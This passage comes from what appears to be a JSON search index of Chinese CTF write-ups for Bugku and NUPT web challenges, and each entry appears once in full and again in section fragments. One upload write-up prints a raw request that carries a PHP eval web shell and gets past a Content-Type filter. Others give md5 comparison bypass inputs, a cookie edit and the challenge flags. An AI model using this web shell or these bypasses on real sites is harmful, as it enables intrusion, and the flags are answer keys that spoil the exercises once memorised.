            "text": "上传测试\n\n\n题目\n\n\n\n\nhttp://ctf.bugku.com/challenges#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95\n\n\nhttp://103.238.227.13:10085/\n\n\nFlag格式：Flag:xxxxxxxxxxxxx\n\n\n\n\n解答思路\n\n\n\n\n\n\n上传漏洞需要检测的两个字段\n\n\n\n\n\n\ncontent-type \n\n\n依次测试各种常用的图片格式\n\n\n\n\n\n\nfilename \n\n\n修改filename的后缀名为图片格式\n\n\n\n\n\n\n流程图\n\n\n解题步骤\n\n\n\n\n上传php一句话，bp拦截\n\n\n\n\n```http\n   POST / HTTP/1.1\n   Host: 103.238.227.13:10085\n   Proxy-Connection: keep-alive\n   Content-Length: 225\n   Cache-Control: max-age=0\n   Origin: http://103.238.227.13:10085\n   Upgrade-Insecure-Requests: 1\n   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2BXYLDylhw7Io7Jh\n   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\n/\n;q=0.8\n   Referer: http://103.238.227.13:10085/\n   Accept-Encoding: gzip, deflate\n   Accept-Language: zh-CN,zh;q=0.9\n\n\n------WebKitFormBoundary2BXYLDylhw7Io7Jh\n   Content-Disposition: form-data; name=\"file\"; filename=\"php.php\"\n   Content-Type: application/octet-stream\n\n\n?php @eval($_POST[123456]);?\n\n   ------WebKitFormBoundary2BXYLDylhw7Io7Jh--\n   ```\n\n\n\n\n修改\nContent-Type: application/octet-stream\n为\nContent-Type: image:jpg\n\n\n\n\n回复：\n\n\n```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Fri, 20 Jul 2018 01:57:17 GMT\n   Content-Type: text/html; charset=utf-8\n   Connection: keep-alive\n   Vary: Accept-Encoding\n   X-Powered-By: PHP/7.0.7\n   Content-Length: 15\n\n\n非图片文件\n   ```\n\n\n\n\n修改\nContent-Type: application/octet-stream\n为\nContent-Type: image:gif\n\n\n\n\n返回：\n\n\nFlag:42e97d465f962c53df9549377b513c7e\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "上传测试"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_1", 
            "text": "", 
            "title": "上传测试"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_2", 
            "text": "http://ctf.bugku.com/challenges#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95  http://103.238.227.13:10085/  Flag格式：Flag:xxxxxxxxxxxxx", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_3", 
            "text": "上传漏洞需要检测的两个字段    content-type   依次测试各种常用的图片格式    filename   修改filename的后缀名为图片格式", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_4", 
            "text": "", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_5", 
            "text": "上传php一句话，bp拦截   ```http\n   POST / HTTP/1.1\n   Host: 103.238.227.13:10085\n   Proxy-Connection: keep-alive\n   Content-Length: 225\n   Cache-Control: max-age=0\n   Origin: http://103.238.227.13:10085\n   Upgrade-Insecure-Requests: 1\n   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2BXYLDylhw7Io7Jh\n   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\n   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng, / ;q=0.8\n   Referer: http://103.238.227.13:10085/\n   Accept-Encoding: gzip, deflate\n   Accept-Language: zh-CN,zh;q=0.9  ------WebKitFormBoundary2BXYLDylhw7Io7Jh\n   Content-Disposition: form-data; name=\"file\"; filename=\"php.php\"\n   Content-Type: application/octet-stream  ?php @eval($_POST[123456]);? \n   ------WebKitFormBoundary2BXYLDylhw7Io7Jh--\n   ```   修改 Content-Type: application/octet-stream 为 Content-Type: image:jpg   回复：  ```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Fri, 20 Jul 2018 01:57:17 GMT\n   Content-Type: text/html; charset=utf-8\n   Connection: keep-alive\n   Vary: Accept-Encoding\n   X-Powered-By: PHP/7.0.7\n   Content-Length: 15  非图片文件\n   ```   修改 Content-Type: application/octet-stream 为 Content-Type: image:gif   返回：  Flag:42e97d465f962c53df9549377b513c7e", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_6", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_upload_test/#_7", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/", 
            "text": "web2\n\n\n题目\n\n\n\n\nhttp://ctf.bugku.com/challenges#web2\n\n\n听说聪明的人都能找到答案\nhttp://120.24.86.145:8002/web2/\n \n\n\n\n\n解答思路\n\n\n\n\n查看页面源代码，获取隐藏信息\n\n\n\n\n流程图\n\n\ngraph TD\nA[收集信息:查看页面源代码] --\n B{是否收集到?}\nB --\n |是| D[页面展示数据]\nD --\n E{是否符合flag格式? }\nE --\n |否|H[暂存入数据库]\nE --\n |是| F[由用户修改或者直接提交flag]\nF --\n G{flag是否正确}\nG --\n |否| H\nG--\n |是| I[存入数据库]\n\n\n\n\n解题步骤\n\n\n\n\n查看源代码 ，查看隐藏信息\n\n\n\n\njavascript\n   \n!flag KEY{Web-2-bugKssNNikls9100}\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5\n \n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "web2"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#web2", 
            "text": "", 
            "title": "web2"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_1", 
            "text": "http://ctf.bugku.com/challenges#web2  听说聪明的人都能找到答案 http://120.24.86.145:8002/web2/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_2", 
            "text": "查看页面源代码，获取隐藏信息", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_3", 
            "text": "graph TD\nA[收集信息:查看页面源代码] --  B{是否收集到?}\nB --  |是| D[页面展示数据]\nD --  E{是否符合flag格式? }\nE --  |否|H[暂存入数据库]\nE --  |是| F[由用户修改或者直接提交flag]\nF --  G{flag是否正确}\nG --  |否| H\nG--  |是| I[存入数据库]", 
            "title": "流程图"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_4", 
            "text": "查看源代码 ，查看隐藏信息   javascript\n    !flag KEY{Web-2-bugKssNNikls9100}", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_5", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[bugku.com]_web2/#_6", 
            "text": "TODO    判断题目特征： web   php   md5     设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/", 
            "text": "单身20年\n\n\n题目\n\n\n\n\nhttp://chinalover.sinaapp.com/web8/\n\n\n\n\n\n解答思路\n\n\nRunning the contributed command:'markdown.preview.toggleLock' failed.\n- 存在网址重定向（\nwindow.location\n），考虑flag隐藏在重定向网页中\n\n\n解题步骤\n\n\n\n\n使用bp拦截：点击超链接，访问\n地址\n：\n\n\n\n\n\n\nhttp://chinalover.sinaapp.com/web8/web8/search_key.php\n\n\n\n\n\n\n在bp history中查看，得到结果\n\n\n\n\n```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Wed, 11 Jul 2018 06:54:53 GMT\n   Content-Type: text/html\n   Connection: keep-alive\n   Via: 1524\n   Content-Length: 100\n\n\nwindow.location=\"./no_key_is_here_forever.php\"; \n\n   key is : nctf{yougotit_script_now}\n   ```\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "单身20年"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#20", 
            "text": "", 
            "title": "单身20年"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#_1", 
            "text": "http://chinalover.sinaapp.com/web8/", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#_2", 
            "text": "Running the contributed command:'markdown.preview.toggleLock' failed.\n- 存在网址重定向（ window.location ），考虑flag隐藏在重定向网页中", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#_3", 
            "text": "使用bp拦截：点击超链接，访问 地址 ：    http://chinalover.sinaapp.com/web8/web8/search_key.php    在bp history中查看，得到结果   ```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Wed, 11 Jul 2018 06:54:53 GMT\n   Content-Type: text/html\n   Connection: keep-alive\n   Via: 1524\n   Content-Length: 100  window.location=\"./no_key_is_here_forever.php\";  \n   key is : nctf{yougotit_script_now}\n   ```", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_20_years/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/", 
            "text": "aaencode\n\n\n题目\n\n\n\n\nhttp://chinalover.sinaapp.com/web20/aaencode.txt\n\n\n\n\n\n解答思路\n\n\n\n\n了解aaencode编码\n\n\n执行代码\n\n\n根据错误提示，对代码进行必要的修改，得到输出结果\n\n\n\n\n解题步骤\n\n\n\n\n\n\n将代码格式化：在每个\n；\n号之后添加回车\n\n\n\n\n\n\n在chrome console中执行代码，发现报错 \n\n\n\n\n\n\n\n\nUncaught ReferenceError: ωﾟﾉ is not defined\n\n\n\n\nPS: 解码网站：https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html\n\n\n\n\n根据错误提示，添加 \nωﾟﾉ\n 的定义\n\n\n\n\njavascript\n   var ωﾟﾉ = \"\";\n\n\n\n\n再次执行，发现没有输出，将最后一行做如下修改\n\n\n\n\njavascript\n   var a= (ﾟДﾟ)['_']((ﾟДﾟ)['_'](ﾟεﾟ + (ﾟДﾟ)[ﾟoﾟ] + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (c ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟｰﾟ) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (o ^ _ ^ o) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟｰﾟ) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟoﾟ])(ﾟΘﾟ))('_');\n   console.log(a);\n\n\n\n\n得到结果\n\n\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "aaencode"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#aaencode", 
            "text": "", 
            "title": "aaencode"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#_1", 
            "text": "http://chinalover.sinaapp.com/web20/aaencode.txt", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#_2", 
            "text": "了解aaencode编码  执行代码  根据错误提示，对代码进行必要的修改，得到输出结果", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#_3", 
            "text": "将代码格式化：在每个 ； 号之后添加回车    在chrome console中执行代码，发现报错      Uncaught ReferenceError: ωﾟﾉ is not defined   PS: 解码网站：https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html   根据错误提示，添加  ωﾟﾉ  的定义   javascript\n   var ωﾟﾉ = \"\";   再次执行，发现没有输出，将最后一行做如下修改   javascript\n   var a= (ﾟДﾟ)['_']((ﾟДﾟ)['_'](ﾟεﾟ + (ﾟДﾟ)[ﾟoﾟ] + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (c ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟｰﾟ) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (c ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (o ^ _ ^ o) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((o ^ _ ^ o) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (o ^ _ ^ o) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + (ﾟｰﾟ) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟΘﾟ) + ((ﾟｰﾟ) + (o ^ _ ^ o)) + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + (ﾟｰﾟ) + ((o ^ _ ^ o) - (ﾟΘﾟ)) + (ﾟДﾟ)[ﾟεﾟ] + ((ﾟｰﾟ) + (ﾟΘﾟ)) + (ﾟΘﾟ) + (ﾟДﾟ)[ﾟoﾟ])(ﾟΘﾟ))('_');\n   console.log(a);   得到结果", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_aaencode/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/", 
            "text": "bypass again\n\n\n题目\n\n\n\n\nhttp://ctf.nuptzj.cn/challenges#bypass%20again\n\n\nview-source:\n\n\nphp\nif (isset($_GET['a']) and isset($_GET['b'])) {\nif ($_GET['a'] != $_GET['b'])\nif (md5($_GET['a']) == md5($_GET['b']))\ndie('Flag: '.$flag);\nelse\nprint 'Wrong.';\n}\n\n\n\n\n解答思路\n\n\n\n\n数组绕过：\n\n\n\n\n如果传入md5函数的参数为数组类型，则返回null，null=\\==null，因此可以通过数组可以绕过 === md5判断 \n\n\n\n\nmd5碰撞绕过\n\n\n\n\n解题步骤\n\n\n\n\n数组绕过\n\n\n\n\n提交\n?a[]=1\nb[]=2\n,得到答案：\n\n\n\n\nFlag: nctf{php_is_so_cool} \n\n\n\n\n\n\nmd5碰撞\n\n\n\n\n提交\n?a=QNKCDZO\nb=240610708\n，得到答案\n\n\n漏洞挖掘思路\n\n\n\n\ntodo\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "bypass again"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#bypass-again", 
            "text": "", 
            "title": "bypass again"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#_1", 
            "text": "http://ctf.nuptzj.cn/challenges#bypass%20again  view-source:  php\nif (isset($_GET['a']) and isset($_GET['b'])) {\nif ($_GET['a'] != $_GET['b'])\nif (md5($_GET['a']) == md5($_GET['b']))\ndie('Flag: '.$flag);\nelse\nprint 'Wrong.';\n}", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#_2", 
            "text": "数组绕过：   如果传入md5函数的参数为数组类型，则返回null，null=\\==null，因此可以通过数组可以绕过 === md5判断    md5碰撞绕过", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#_3", 
            "text": "数组绕过   提交 ?a[]=1 b[]=2 ,得到答案：   Flag: nctf{php_is_so_cool}     md5碰撞   提交 ?a=QNKCDZO b=240610708 ，得到答案", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#_4", 
            "text": "todo", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_bypass_again/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/", 
            "text": "cookie\n\n\n题目\n\n\n\n\nCOOKIE\n\n\nhttp://chinalover.sinaapp.com/web10/index.php\n\n\n\n\n解答思路\n\n\n\n\n提示cookie，并且提示0==not，所以应当将0改为1\n\n\n\n\n解题步骤\n\n\n\n\n使用bp拦截：点击超链接，访问\n地址\n：\n\n\n\n\n\n\nhttp://chinalover.sinaapp.com/web10/index.php\n\n\n\n\n\n\n\n\n修改cookie参数\nLogin=1\n为\nLogin=0\n\n\n\n\n\n\n得到返回结果\n\n\n\n\n\n\n```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Wed, 11 Jul 2018 08:29:53 GMT\n   Content-Type: text/html\n   Connection: keep-alive\n   Via: 1528\n   Content-Length: 43\n\n\nflag:nctf{cookie_is_different_from_session}\n   ```\n\n\n漏洞挖掘思路\n\n\n\n\n无\n\n\n\n\n自动化解析\n\n\n\n\n\n\nTODO\n\n\n\n\n\n\n判断题目特征：\nweb\n \nphp\n \nmd5 collision\n\n\n\n\n设定题目难度等级\nlevel\n为simple\n\n\n提交相应符合要求的字符串", 
            "title": "cookie"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#cookie", 
            "text": "", 
            "title": "cookie"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#_1", 
            "text": "", 
            "title": "题目"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#cookie_1", 
            "text": "http://chinalover.sinaapp.com/web10/index.php", 
            "title": "COOKIE"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#_2", 
            "text": "提示cookie，并且提示0==not，所以应当将0改为1", 
            "title": "解答思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#_3", 
            "text": "使用bp拦截：点击超链接，访问 地址 ：    http://chinalover.sinaapp.com/web10/index.php     修改cookie参数 Login=1 为 Login=0    得到返回结果    ```http\n   HTTP/1.1 200 OK\n   Server: nginx\n   Date: Wed, 11 Jul 2018 08:29:53 GMT\n   Content-Type: text/html\n   Connection: keep-alive\n   Via: 1528\n   Content-Length: 43  flag:nctf{cookie_is_different_from_session}\n   ```", 
            "title": "解题步骤"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#_4", 
            "text": "无", 
            "title": "漏洞挖掘思路"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_cookie/#_5", 
            "text": "TODO    判断题目特征： web   php   md5 collision   设定题目难度等级 level 为simple  提交相应符合要求的字符串", 
            "title": "自动化解析"
        }, 
        {
            "location": "/wargame/web/[ctf.nuptzj.cn]_md5_collision/", 
